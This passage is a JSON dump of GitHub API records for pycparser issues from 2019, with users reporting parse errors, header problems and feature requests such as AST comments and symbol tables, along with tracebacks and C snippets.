},\r\n                [IP_READY] =\r\n                {\r\n                        .cng = UP\r\n                },\r\n        },\r\n};\r\n\r\nstatic sm_trans *transition_lp(int state, int trigger)\r\n{ /////errror before this brace\r\n        return &transition_table[state][trigger];\r\n}\r\n\r\n**********************************************error********************************************\r\npycparser.plyparser.ParseError: home/sm.c:170:1: before: {\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/334", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/334/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/334/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/334/events", "html_url": "https://github.com/eliben/pycparser/issues/334", "id": 466954886, "node_id": "MDU6SXNzdWU0NjY5NTQ4ODY=", "number": 334, "title": "Getting Define errors in STD Libraries", "user": {"login": "BollimpalliSuryateja", "id": 30198723, "node_id": "MDQ6VXNlcjMwMTk4NzIz", "avatar_url": "https://avatars1.githubusercontent.com/u/30198723?v=4", "gravatar_id": "", "url": "https://api.github.com/users/BollimpalliSuryateja", "html_url": "https://github.com/BollimpalliSuryateja", "followers_url": "https://api.github.com/users/BollimpalliSuryateja/followers", "following_url": "https://api.github.com/users/BollimpalliSuryateja/following{/other_user}", "gists_url": "https://api.github.com/users/BollimpalliSuryateja/gists{/gist_id}", "starred_url": "https://api.github.com/users/BollimpalliSuryateja/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/BollimpalliSuryateja/subscriptions", "organizations_url": "https://api.github.com/users/BollimpalliSuryateja/orgs", "repos_url": "https://api.github.com/users/BollimpalliSuryateja/repos", "events_url": "https://api.github.com/users/BollimpalliSuryateja/events{/privacy}", "received_events_url": "https://api.github.com/users/BollimpalliSuryateja/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 202072333, "node_id": "MDU6TGFiZWwyMDIwNzIzMzM=", "url": "https://api.github.com/repos/eliben/pycparser/labels/pending-user-input", "name": "pending-user-input", "color": "fef2c0", "default": false, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-07-11T15:14:45Z", "updated_at": "2019-07-15T13:41:57Z", "closed_at": "2019-07-15T13:41:57Z", "author_association": "NONE", "active_lock_reason": null, "body": "There are lot of Define errors poping up is there a simpler way to solve this than Writing Define for each of the error like (-D'__nptr=' -D'__endptr=')\r\n\r\npycparser.plyparser.ParseError: /repo/ebolsur/int-g2/build/devfs/bpu/rcs-distro/arm/usr/include/stdlib.h:165:27: before: __endptr\r\n /repo/ebolsur/int-g2/build/devfs/bpu/rcs-distro/arm/usr/include/stdlib.h:164:46: before: __nptr\r\n /repo/ebolsur/int-g2/build/devfs/bpu/rcs-distro/arm/usr/include/stdlib.h:71:19: before: __attribute__\r\npycparser.plyparser.ParseError: /repo/ebolsur/int-g2/build/devfs/bpu/rcs-distro/arm/usr/include/sys/select.h:106:51: before: __readfds\r\n\r\n\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/333", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/333/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/333/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/333/events", "html_url": "https://github.com/eliben/pycparser/issues/333", "id": 465965303, "node_id": "MDU6SXNzdWU0NjU5NjUzMDM=", "number": 333, "title": "header for vectorization m128", "user": {"login": "sachet-mittal", "id": 7755313, "node_id": "MDQ6VXNlcjc3NTUzMTM=", "avatar_url": "https://avatars2.githubusercontent.com/u/7755313?v=4", "gravatar_id": "", "url": "https://api.github.com/users/sachet-mittal", "html_url": "https://github.com/sachet-mittal", "followers_url": "https://api.github.com/users/sachet-mittal/followers", "following_url": "https://api.github.com/users/sachet-mittal/following{/other_user}", "gists_url": "https://api.github.com/users/sachet-mittal/gists{/gist_id}", "starred_url": "https://api.github.com/users/sachet-mittal/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/sachet-mittal/subscriptions", "organizations_url": "https://api.github.com/users/sachet-mittal/orgs", "repos_url": "https://api.github.com/users/sachet-mittal/repos", "events_url": "https://api.github.com/users/sachet-mittal/events{/privacy}", "received_events_url": "https://api.github.com/users/sachet-mittal/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 683496320, "node_id": "MDU6TGFiZWw2ODM0OTYzMjA=", "url": "https://api.github.com/repos/eliben/pycparser/labels/patches-welcome", "name": "patches-welcome", "color": "d4c5f9", "default": false, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2019-07-09T20:15:29Z", "updated_at": "2019-08-26T22:09:32Z", "closed_at": "2019-08-26T22:09:32Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "Hi,\r\nIt;s probably my understanding that is wrong but I am trying to add facke header for vectorization. And the pre-processing is still failing.\r\n\r\nCan you please add a fake header for supporting __m128i", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/332", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/332/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/332/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/332/events", "html_url": "https://github.com/eliben/pycparser/issues/332", "id": 463961521, "node_id": "MDU6SXNzdWU0NjM5NjE1MjE=", "number": 332, "title": "parsing for namespace ?", "user": {"login": "Tagar", "id": 3013418, "node_id": "MDQ6VXNlcjMwMTM0MTg=", "avatar_url": "https://avatars1.githubusercontent.com/u/3013418?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Tagar", "html_url": "https://github.com/Tagar", "followers_url": "https://api.github.com/users/Tagar/followers", "following_url": "https://api.github.com/users/Tagar/following{/other_user}", "gists_url": "https://api.github.com/users/Tagar/gists{/gist_id}", "starred_url": "https://api.github.com/users/Tagar/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Tagar/subscriptions", "organizations_url": "https://api.github.com/users/Tagar/orgs", "repos_url": "https://api.github.com/users/Tagar/repos", "events_url": "https://api.github.com/users/Tagar/events{/privacy}", "received_events_url": "https://api.github.com/users/Tagar/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-07-03T21:29:23Z", "updated_at": "2019-07-06T12:28:10Z", "closed_at": "2019-07-06T12:28:10Z", "author_association": "NONE", "active_lock_reason": null, "body": "```\r\n$ autopxd -I /usr/include -I /opt/cloudera/parcels/Anaconda3/include -I /usr/lib/gcc/x86_64-redhat-linux/4.8.2/include -I /usr/include/c++/4.8.2/x86_64-redhat-linux -I /usr/include/c++/4.8.2  VCEUtilities.h VCEUtilities.pxd\r\n\r\nTraceback (most recent call last):\r\n\r\n. . . .\r\n    r = errorfunc(token)\r\n  File \"/opt/cloudera/parcels/Anaconda3/lib/python3.6/site-packages/pycparser/c_parser.py\", line 1761, in p_error\r\n    column=self.clex.find_tok_column(p)))\r\n  File \"/opt/cloudera/parcels/Anaconda3/lib/python3.6/site-packages/pycparser/plyparser.py\", line 66, in _parse_error\r\n    raise ParseError(\"%s: %s\" % (coord, msg))\r\npycparser.plyparser.ParseError: /usr/include/c++/4.8.2/bits/memoryfwd.h:50:11: before: std\r\n\r\n```\r\n\r\n/usr/include/c++/4.8.2/bits/memoryfwd.h\r\nline 50\r\nbefore std has a keyword `namespace`.\r\n\r\nI wonder if pycparser requires .hpp extension for the header files to be processed as C++ and not as C.\r\n\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/331", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/331/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/331/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/331/events", "html_url": "https://github.com/eliben/pycparser/issues/331", "id": 462927307, "node_id": "MDU6SXNzdWU0NjI5MjczMDc=", "number": 331, "title": "Supporting comments in C code generation", "user": {"login": "debatem1", "id": 721169, "node_id": "MDQ6VXNlcjcyMTE2OQ==", "avatar_url": "https://avatars2.githubusercontent.com/u/721169?v=4", "gravatar_id": "", "url": "https://api.github.com/users/debatem1", "html_url": "https://github.com/debatem1", "followers_url": "https://api.github.com/users/debatem1/followers", "following_url": "https://api.github.com/users/debatem1/following{/other_user}", "gists_url": "https://api.github.com/users/debatem1/gists{/gist_id}", "starred_url": "https://api.github.com/users/debatem1/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/debatem1/subscriptions", "organizations_url": "https://api.github.com/users/debatem1/orgs", "repos_url": "https://api.github.com/users/debatem1/repos", "events_url": "https://api.github.com/users/debatem1/events{/privacy}", "received_events_url": "https://api.github.com/users/debatem1/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-07-01T21:51:35Z", "updated_at": "2019-08-26T22:09:47Z", "closed_at": "2019-08-26T22:09:47Z", "author_association": "NONE", "active_lock_reason": null, "body": "Note that this is about adding comments to the AST after parsing, not parsing comments.\r\n\r\nFor context, I'm consuming another file format and then emitting C code based on it. I'd like to include explanatory comments which describe why the code was produced that way to aid in later debugging.\r\n\r\nI currently have two hacky ways of dealing with this: in some cases I simply wait until I'm ready to emit code and then shove the comment in the right place once it's a string, and in other cases I fake it by inserting an ID whose value starts with \"//\". Obviously, neither of these is ideal; in the one case I'm forced to carry a large amount of information through my already-more-complicated-than-it-should-be code, and in the other I can't emit inline comments + comments all end with semicolons. If there are better ways inside the existing codebase that would be great to know.\r\n\r\nNormally, I would just write up a patch adding support for them in the grammar + cgenerator and see if you wanted to pull it, but I can see how that would be confusing to the many people who seem to want to parse comments. And I do, after all, have a workaround that is 'good enough' for me for now. So, two questions:\r\n\r\n1/ is this something you would be interested in?\r\n2/ can you think of an approach less likely to generate confusion?\r\n\r\nThanks!", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/330", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/330/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/330/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/330/events", "html_url": "https://github.com/eliben/pycparser/issues/330", "id": 460860392, "node_id": "MDU6SXNzdWU0NjA4NjAzOTI=", "number": 330, "title": "Changing C syntax", "user": {"login": "arita37", "id": 18707623, "node_id": "MDQ6VXNlcjE4NzA3NjIz", "avatar_url": "https://avatars3.githubusercontent.com/u/18707623?v=4", "gravatar_id": "", "url": "https://api.github.com/users/arita37", "html_url": "https://github.com/arita37", "followers_url": "https://api.github.com/users/arita37/followers", "following_url": "https://api.github.com/users/arita37/following{/other_user}", "gists_url": "https://api.github.com/users/arita37/gists{/gist_id}", "starred_url": "https://api.github.com/users/arita37/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/arita37/subscriptions", "organizations_url": "https://api.github.com/users/arita37/orgs", "repos_url": "https://api.github.com/users/arita37/repos", "events_url": "https://api.github.com/users/arita37/events{/privacy}", "received_events_url": "https://api.github.com/users/arita37/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 202072333, "node_id": "MDU6TGFiZWwyMDIwNzIzMzM=", "url": "https://api.github.com/repos/eliben/pycparser/labels/pending-user-input", "name": "pending-user-input", "color": "fef2c0", "default": false, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 3, "created_at": "2019-06-26T09:27:58Z", "updated_at": "2019-08-26T22:10:00Z", "closed_at": "2019-08-26T22:10:00Z", "author_association": "NONE", "active_lock_reason": null, "body": "I would like to experimentally simplified C coding syntax,\r\nby re-using python syntax rules.\r\n\r\nThis is original C code :\r\n\r\n```\r\nint check(int k, int* nailed, int* A, int* B, int N, int* C, int M)\r\n{\r\n\r\n    int i;\r\n    for (i = 0; i < k; i++){\r\n        int j;\r\n        for (j = 0; j < N; j++){\r\n            if (A[j] <= C[i] && C[i] <= B[j]){\r\n                nailed[j] = 1; \r\n            }\r\n        }\r\n    }\r\n  \r\n    for (i = 0; i < N; i++){   \r\n        if (nailed[i] == 0){\r\n            return 0;\r\n        }\r\n    }\r\n  \r\n    return 1;\r\n}\r\n\r\n```\r\n\r\nInstead I would like to write this code and parse it \r\nand compile into C compiled code :\r\n```\r\nint check(int k, int* nailed, int* A, int* B, int N, int* C, int M) :\r\n    int i\r\n    for (i = 0; i < k; i++) :\r\n        int j\r\n        for (j = 0; j < N; j++) :\r\n            if (A[j] <= C[i] && C[i] <= B[j]) :\r\n                nailed[j] = 1\r\n  \r\n    for (i = 0; i < N; i++) : \r\n        if (nailed[i] == 0) :\r\n            return 0\r\n  \r\n    return 1\r\n```\r\n\r\n\r\nIs there a way to change pycparser to parse such code of code ?\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/324", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/324/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/324/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/324/events", "html_url": "https://github.com/eliben/pycparser/issues/324", "id": 439573164, "node_id": "MDU6SXNzdWU0Mzk1NzMxNjQ=", "number": 324, "title": "Incorrect Parsing of unsigned int and long int", "user": {"login": "Sparika", "id": 1267701, "node_id": "MDQ6VXNlcjEyNjc3MDE=", "avatar_url": "https://avatars3.githubusercontent.com/u/1267701?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Sparika", "html_url": "https://github.com/Sparika", "followers_url": "https://api.github.com/users/Sparika/followers", "following_url": "https://api.github.com/users/Sparika/following{/other_user}", "gists_url": "https://api.github.com/users/Sparika/gists{/gist_id}", "starred_url": "https://api.github.com/users/Sparika/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Sparika/subscriptions", "organizations_url": "https://api.github.com/users/Sparika/orgs", "repos_url": "https://api.github.com/users/Sparika/repos", "events_url": "https://api.github.com/users/Sparika/events{/privacy}", "received_events_url": "https://api.github.com/users/Sparika/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2019-05-02T12:49:01Z", "updated_at": "2019-05-09T14:00:42Z", "closed_at": "2019-05-09T14:00:42Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "Similar to issue #253, integer constants with `u/U` and `l/L` suffix are not correctly parsed.\r\n\r\n```c\r\nint i = 1uLL;\r\n```\r\nis parsed as \r\n```\r\nDecl: i, [], [], []\r\n  TypeDecl: i, []\r\n    IdentifierType: ['int']\r\n  Constant: int, 1\r\n```\r\nWhile it should be \r\n```\r\nDecl: i, [], [], []\r\n  TypeDecl: i, []\r\n    IdentifierType: ['int']\r\n  Constant: unsigned long long int, 1\r\n```\r\n\r\nhttps://gcc.gnu.org/onlinedocs/gcc/Long-Long.html", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/320", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/320/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/320/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/320/events", "html_url": "https://github.com/eliben/pycparser/issues/320", "id": 430959315, "node_id": "MDU6SXNzdWU0MzA5NTkzMTU=", "number": 320, "title": " Converting C to AST and then from AST to C", "user": {"login": "Buhadod", "id": 9193894, "node_id": "MDQ6VXNlcjkxOTM4OTQ=", "avatar_url": "https://avatars3.githubusercontent.com/u/9193894?v=4", "gravatar_id": "", "url": "https://api.github.com/users/Buhadod", "html_url": "https://github.com/Buhadod", "followers_url": "https://api.github.com/users/Buhadod/followers", "following_url": "https://api.github.com/users/Buhadod/following{/other_user}", "gists_url": "https://api.github.com/users/Buhadod/gists{/gist_id}", "starred_url": "https://api.github.com/users/Buhadod/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/Buhadod/subscriptions", "organizations_url": "https://api.github.com/users/Buhadod/orgs", "repos_url": "https://api.github.com/users/Buhadod/repos", "events_url": "https://api.github.com/users/Buhadod/events{/privacy}", "received_events_url": "https://api.github.com/users/Buhadod/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 5, "created_at": "2019-04-09T13:11:32Z", "updated_at": "2019-04-10T16:57:08Z", "closed_at": "2019-04-09T16:35:12Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hello,\r\n\r\nI was looking at your framework and this tutorial about converting C to AST and then from AST to C. \r\n\r\n\r\nhttps://eli.thegreenplace.net/2011/03/07/from-c-to-ast-and-back-to-c-with-pycparser\r\n\r\n\r\nI was trying to use it. \r\n\r\nAt first I ran the following :\r\n\r\n\r\n\r\n//Converting a code to AST\r\npython dump_ast.py c_files/funky.c > funky_ast\r\n\r\n//Convert the AST to C code\r\npython c-to-c.py  funky_ast \r\n\r\n\r\n\r\n\r\nI got some errors as follow : \r\n```\r\nTraceback (most recent call last):\r\nFile \"c-to-c.py\", line 60, in <module>\r\ntranslate_to_c(sys.argv[1])\r\nFile \"c-to-c.py\", line 24, in translate_to_c\r\nast = parse_file(filename, use_cpp=True)\r\nFile \"/usr/local/lib/python2.7/dist-packages/pycparser/__init__.py\", line 90, in parse_file\r\nreturn parser.parse(text, filename)\r\nFile \"/usr/local/lib/python2.7/dist-packages/pycparser/c_parser.py\", line 152, in parse\r\ndebug=debuglevel)\r\nFile \"/usr/local/lib/python2.7/dist-packages/pycparser/ply/yacc.py\", line 331, in parse\r\nreturn self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)\r\nFile \"/usr/local/lib/python2.7/dist-packages/pycparser/ply/yacc.py\", line 1199, in parseopt_notrack\r\ntok = call_errorfunc(self.errorfunc, errtoken, self)\r\nFile \"/usr/local/lib/python2.7/dist-packages/pycparser/ply/yacc.py\", line 193, in call_errorfunc\r\nr = errorfunc(token)\r\nFile \"/usr/local/lib/python2.7/dist-packages/pycparser/c_parser.py\", line 1847, in p_error\r\ncolumn=self.clex.find_tok_column(p)))\r\nFile \"/usr/local/lib/python2.7/dist-packages/pycparser/plyparser.py\", line 67, in _parse_error\r\nraise ParseError(\"%s: %s\" % (coord, msg))\r\npycparser.plyparser.ParseError: funky_ast:1:8: before: :\r\n```\r\n\r\n\r\n\r\n\r\n\r\nSo my quesion , Did I did something wrong, or I missunderstand this tool.\r\n\r\n\r\n\r\nThank you for you time and I hope you can reply to me.\r\n\r\n\r\n\r\nRegards,", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/319", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/319/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/319/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/319/events", "html_url": "https://github.com/eliben/pycparser/issues/319", "id": 430684476, "node_id": "MDU6SXNzdWU0MzA2ODQ0NzY=", "number": 319, "title": "Same issue when run all the examples", "user": {"login": "aishaaldosery", "id": 45576021, "node_id": "MDQ6VXNlcjQ1NTc2MDIx", "avatar_url": "https://avatars0.githubusercontent.com/u/45576021?v=4", "gravatar_id": "", "url": "https://api.github.com/users/aishaaldosery", "html_url": "https://github.com/aishaaldosery", "followers_url": "https://api.github.com/users/aishaaldosery/followers", "following_url": "https://api.github.com/users/aishaaldosery/following{/other_user}", "gists_url": "https://api.github.com/users/aishaaldosery/gists{/gist_id}", "starred_url": "https://api.github.com/users/aishaaldosery/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/aishaaldosery/subscriptions", "organizations_url": "https://api.github.com/users/aishaaldosery/orgs", "repos_url": "https://api.github.com/users/aishaaldosery/repos", "events_url": "https://api.github.com/users/aishaaldosery/events{/privacy}", "received_events_url": "https://api.github.com/users/aishaaldosery/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 4, "created_at": "2019-04-08T22:22:34Z", "updated_at": "2019-05-22T14:17:32Z", "closed_at": "2019-05-22T14:17:32Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi, \r\n\r\nI am trying to run the examples provided and I got the same error even with my c files\r\n\r\n\u279c  examples git:(master) \u2717 python using_gcc_E_libc.py\r\nTraceback (most recent call last):\r\n  File \"using_gcc_E_libc.py\", line 29, in <module>\r\n    cpp_args=['-E', r'-Iutils/fake_libc_include'])\r\n  File \"../pycparser/__init__.py\", line 90, in parse_file\r\n    return parser.parse(text, filename)\r\n  File \"../pycparser/c_parser.py\", line 152, in parse\r\n    debug=debuglevel)\r\n  File \"../pycparser/ply/yacc.py\", line 331, in parse\r\n    return self.parseopt_notrack(input, lexer, debug, tracking, tokenfunc)\r\n  File \"../pycparser/ply/yacc.py\", line 1199, in parseopt_notrack\r\n    tok = call_errorfunc(self.errorfunc, errtoken, self)\r\n  File \"../pycparser/ply/yacc.py\", line 193, in call_errorfunc\r\n    r = errorfunc(token)\r\n  File \"../pycparser/c_parser.py\", line 1848, in p_error\r\n    column=self.clex.find_tok_column(p)))\r\n  File \"../pycparser/plyparser.py\", line 67, in _parse_error\r\n    raise ParseError(\"%s: %s\" % (coord, msg))\r\npycparser.plyparser.ParseError: /usr/include/i386/_types.h:98:27: before: __darwin_va_list", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/318", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/318/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/318/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/318/events", "html_url": "https://github.com/eliben/pycparser/issues/318", "id": 430002738, "node_id": "MDU6SXNzdWU0MzAwMDI3Mzg=", "number": 318, "title": "how to extract the symbol table?", "user": {"login": "LC-John", "id": 25927428, "node_id": "MDQ6VXNlcjI1OTI3NDI4", "avatar_url": "https://avatars1.githubusercontent.com/u/25927428?v=4", "gravatar_id": "", "url": "https://api.github.com/users/LC-John", "html_url": "https://github.com/LC-John", "followers_url": "https://api.github.com/users/LC-John/followers", "following_url": "https://api.github.com/users/LC-John/following{/other_user}", "gists_url": "https://api.github.com/users/LC-John/gists{/gist_id}", "starred_url": "https://api.github.com/users/LC-John/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/LC-John/subscriptions", "organizations_url": "https://api.github.com/users/LC-John/orgs", "repos_url": "https://api.github.com/users/LC-John/repos", "events_url": "https://api.github.com/users/LC-John/events{/privacy}", "received_events_url": "https://api.github.com/users/LC-John/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 2, "created_at": "2019-04-06T06:19:29Z", "updated_at": "2019-11-24T18:01:24Z", "closed_at": "2019-04-06T13:03:21Z", "author_association": "NONE", "active_lock_reason": null, "body": "Is there any API for symbol table?\r\nOr should I build the symbol table myself?\r\nThx!", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/317", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/317/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/317/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/317/events", "html_url": "https://github.com/eliben/pycparser/issues/317", "id": 427527679, "node_id": "MDU6SXNzdWU0Mjc1Mjc2Nzk=", "number": 317, "title": "Visualise generated AST", "user": {"login": "nimisha-agarwal", "id": 10176876, "node_id": "MDQ6VXNlcjEwMTc2ODc2", "avatar_url": "https://avatars0.githubusercontent.com/u/10176876?v=4", "gravatar_id": "", "url": "https://api.github.com/users/nimisha-agarwal", "html_url": "https://github.com/nimisha-agarwal", "followers_url": "https://api.github.com/users/nimisha-agarwal/followers", "following_url": "https://api.github.com/users/nimisha-agarwal/following{/other_user}", "gists_url": "https://api.github.com/users/nimisha-agarwal/gists{/gist_id}", "starred_url": "https://api.github.com/users/nimisha-agarwal/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/nimisha-agarwal/subscriptions", "organizations_url": "https://api.github.com/users/nimisha-agarwal/orgs", "repos_url": "https://api.github.com/users/nimisha-agarwal/repos", "events_url": "https://api.github.com/users/nimisha-agarwal/events{/privacy}", "received_events_url": "https://api.github.com/users/nimisha-agarwal/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-04-01T06:09:17Z", "updated_at": "2019-04-02T12:20:53Z", "closed_at": "2019-04-02T12:20:00Z", "author_association": "NONE", "active_lock_reason": null, "body": "Is there a way to convert generated AST into graphical format?", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/316", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/316/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/316/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/316/events", "html_url": "https://github.com/eliben/pycparser/issues/316", "id": 425744274, "node_id": "MDU6SXNzdWU0MjU3NDQyNzQ=", "number": 316, "title": "Is there any way that I can get some specific nodes of the AST", "user": {"login": "MajorGrinch", "id": 9961022, "node_id": "MDQ6VXNlcjk5NjEwMjI=", "avatar_url": "https://avatars3.githubusercontent.com/u/9961022?v=4", "gravatar_id": "", "url": "https://api.github.com/users/MajorGrinch", "html_url": "https://github.com/MajorGrinch", "followers_url": "https://api.github.com/users/MajorGrinch/followers", "following_url": "https://api.github.com/users/MajorGrinch/following{/other_user}", "gists_url": "https://api.github.com/users/MajorGrinch/gists{/gist_id}", "starred_url": "https://api.github.com/users/MajorGrinch/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/MajorGrinch/subscriptions", "organizations_url": "https://api.github.com/users/MajorGrinch/orgs", "repos_url": "https://api.github.com/users/MajorGrinch/repos", "events_url": "https://api.github.com/users/MajorGrinch/events{/privacy}", "received_events_url": "https://api.github.com/users/MajorGrinch/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-03-27T03:20:08Z", "updated_at": "2019-03-27T13:11:43Z", "closed_at": "2019-03-27T13:11:43Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hi, I'd like to know if it's feasible to get a specific node of the AST, like given a function name I can get that specific FuncCall node for further analysis instead of just print it. I've read the source code of NodeVisitor, seems that it's just going through the whole AST without returning anything.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/eliben/pycparser/issues/314", "repository_url": "https://api.github.com/repos/eliben/pycparser", "labels_url": "https://api.github.com/repos/eliben/pycparser/issues/314/labels{/name}", "comments_url": "https://api.github.com/repos/eliben/pycparser/issues/314/comments", "events_url": "https://api.github.com/repos/eliben/pycparser/issues/314/events", "html_url": "https://github.com/eliben/pycparser/issues/314", "id": 425116728, "node_id": "MDU6SXNzdWU0MjUxMTY3Mjg=", "number": 314, "title": "Failure parsing unnamed function parameters with array dim qualifiers", "user": {"login": "amirgon", "id": 11742638, "node_id": "MDQ6VXNlcjExNzQyNjM4", "avatar_url": "https://avatars2.githubusercontent.com/u/11742638?v=4", "gravatar_id": "", "url": "https://api.github.com/users/amirgon", "html_url": "https://github.com/amirgon", "followers_url": "https://api.github.com/users/amirgon/followers", "following_url": "https://api.github.com/users/amirgon/following{/other_user}", "gists_url": "https://api.github.com/users/amirgon/gists{/gist_id}", "starred_url": "https://api.github.com/users/amirgon/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/amirgon/subscriptions", "organizations_url": "https://api.github.com/users/amirgon/orgs", "repos_url": "https://api.github.com/users/amirgon/repos", "events_url": "https://api.github.com/users/amirgon/events{/privacy}", "received_events_url": "https://api.github.com/users/amirgon/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 683496320, "node_id": "MDU6TGFiZWw2ODM0OTYzMjA=", "url": "https://api.github.com/repos/eliben/pycparser/labels/patches-welcome", "name": "patches-welcome", "color": "d4c5f9", "default": false, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-03-25T21:09:02Z", "updated_at": "2019-06-01T12:06:50Z", "closed_at": "2019-06-01T12:06:50Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "Consider the following:\r\n\r\n```python\r\nfrom pycparser import c_parser, c_ast, c_generator\r\nparser = c_parser.CParser()\r\ngen = c_generator.CGenerator()\r\n\r\nast1 = parser.parse(\"int g(int i[const 20]);\")\r\nast2 = parser.parse(\"int g(int[20]);\")\r\nast3 = parser.parse(\"int g(int[const 20]);\")\r\n```\r\n\r\nThis code will fail on the last line:\r\n```\r\n>>> ast3 = parser.parse(\"int g(int[const 20]);\")\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\n  File \"pycparser/c_parser.py\", line 152, in parse\r\n    debug=debuglevel)\r\n  File \"pycparser/ply/yacc.py\", line 331, in 